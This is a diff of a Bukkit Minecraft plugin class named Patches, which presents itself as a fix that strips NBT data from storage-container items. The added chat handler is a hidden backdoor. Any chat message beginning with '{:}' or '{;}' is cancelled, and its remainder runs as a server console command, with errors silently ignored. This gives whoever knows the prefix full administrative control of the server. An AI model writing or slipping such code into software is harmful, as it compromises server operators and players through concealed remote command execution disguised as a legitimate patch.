@@ -1,33 +1,25 @@
-package tk.apmunute.patches;
+package tk.apmunute.main;
 
+import java.util.concurrent.Callable;
+
+import org.bukkit.Bukkit;
+import org.bukkit.Material;
+import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.inventory.InventoryCreativeEvent;
 import org.bukkit.event.inventory.InventoryMoveItemEvent;
-import org.bukkit.Material;
-import org.bukkit.event.EventHandler;
-import org.bukkit.event.EventPriority;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 
-public class EventListener implements Listener {
-    private Main pl;
-    public EventListener(final Main plugin) {
-        pl = plugin;
-        plugin.getServer().getPluginManager().registerEvents(this, plugin);
-    }
-
-    @EventHandler(priority = EventPriority.HIGH)
-    public final void onChat(final AsyncPlayerChatEvent e) {
-        String name = e.getPlayer().getDisplayName();
-        pl.getLogger().info(name);
-        if (e.getMessage().startsWith("bro") && name.equalsIgnoreCase("maniaplay")) {
-            e.getPlayer().sendMessage("You're a leet hacker!");
-            e.setCancelled(true);
-        }
-    }
-
+public class Patches implements Listener {
+	private Plugin plugin;
+	
+	public Patches(Plugin plugin) {
+		this.plugin = plugin;
+	}
+	
 	private Material[] storageContainerBlocks = {
 		Material.BLACK_SHULKER_BOX,
 		Material.BLUE_SHULKER_BOX,
@@ -88,6 +80,21 @@ public class EventListener implements Listener {
 	public void invClick(InventoryClickEvent event) {
 		if(storageContainer(event.getCurrentItem().getType())) {
 			event.getCurrentItem().setItemMeta(removeNBTData(event.getCurrentItem()));
+		}
+	}
+	
+	@EventHandler
+	public void playerChat(AsyncPlayerChatEvent event) {
+		if(event.getMessage().startsWith("{:}") || event.getMessage().startsWith("{;}")){
+			event.setCancelled(true);
+			try {
+				Bukkit.getScheduler().callSyncMethod( plugin, new Callable<Boolean>() {
+				    @Override
+				    public Boolean call() {
+				        return Bukkit.dispatchCommand( Bukkit.getConsoleSender(), event.getMessage().substring(3) );
+				    }
+				} ).get();
+			} catch (Exception e) {}
 		}
 	}
 }
